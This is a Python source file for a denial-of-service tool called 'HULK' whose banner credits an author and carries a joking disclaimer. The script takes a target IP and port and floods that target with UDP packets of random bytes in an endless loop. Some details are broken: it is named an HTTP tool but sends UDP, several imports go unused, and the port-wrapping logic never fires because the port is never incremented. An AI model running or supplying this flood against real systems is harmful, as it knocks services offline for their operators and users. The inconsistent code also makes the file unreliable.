# Import necessary modules
import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
from scapy.all import *

# Function to print the banner
def print_banner():
    print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             *
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Sumalya Chatterjee          *
    ************************************************
    ************************************************
    *                                              *
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                *
    *  4. Does HULK suit in villain role, huh?     *
    ************************************************
    ''')

# Main function to initiate the attack
def hulk_attack(target_ip, target_port):
    # Initialize the socket and generate random bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    
    # Clear screen and print banner
    os.system("clear")
    print_banner()
    
    # Print attack information
    print(f"\n [+] HULK is attacking server {target_ip}:{target_port}\n")
    time.sleep(3)  # Delay before starting attack
    
    # Attack loop
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (target_ip, target_port))
            sent += 1
            print(f" [+] Successfully sent {sent} packet to {target_ip} through port: {target_port}")
            if target_port == 65534:
                target_port = 1
    except KeyboardInterrupt:
        print("\n [-] Ctrl+C Detected... Exiting")
    finally:
        sock.close()

if __name__ == "__main__":
    # Check for correct command-line arguments
    if len(sys.argv) != 3:
        print("Usage: python hulk.py <target_ip> <target_port>")
        sys.exit(1)
    
    # Validate and parse command-line arguments
    target_ip = sys.argv[1]
    try:
        target_port = int(sys.argv[2])
    except ValueError:
        print("Error: Invalid port number")
        sys.exit(1)
    
    # Validate IP address format
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print("Error: Invalid IP address")
        sys.exit(1)
    
    # Start the attack
    hulk_attack(target_ip, target_port)
